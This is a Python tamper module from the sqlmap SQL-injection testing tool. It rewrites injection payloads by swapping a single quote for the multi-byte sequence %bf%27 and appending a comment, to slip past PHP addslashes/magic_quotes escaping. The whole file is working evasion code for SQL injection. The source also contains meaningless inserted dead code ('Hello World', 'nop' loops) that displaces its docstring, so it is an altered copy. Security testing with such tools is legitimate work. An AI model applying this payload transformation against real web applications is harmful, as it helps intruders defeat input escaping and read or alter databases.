"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import re
from lib.core.compat import xrange
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    if False:
        print('Hello World!')
    pass

def tamper(payload, **kwargs):
    if False:
        for i in range(10):
            print('nop')
    '\n    Replaces quote character (\') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)\n\n    Notes:\n        * Useful for bypassing magic_quotes/addslashes feature\n\n    Reference:\n        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string\n\n    >>> tamper("1\' AND 1=1")\n    \'1%bf%27-- -\'\n    '
    retVal = payload
    if payload:
        found = False
        retVal = ''
        for i in xrange(len(payload)):
            if payload[i] == "'" and (not found):
                retVal += '%bf%27'
                found = True
            else:
                retVal += payload[i]
                continue
        if found:
            _ = re.sub('(?i)\\s*(AND|OR)[\\s(]+([^\\s]+)\\s*(=|LIKE)\\s*\\2', '', retVal)
            if _ != retVal:
                retVal = _
                retVal += '-- -'
            elif not any((_ in retVal for _ in ('#', '--', '/*'))):
                retVal += '-- -'
    return retVal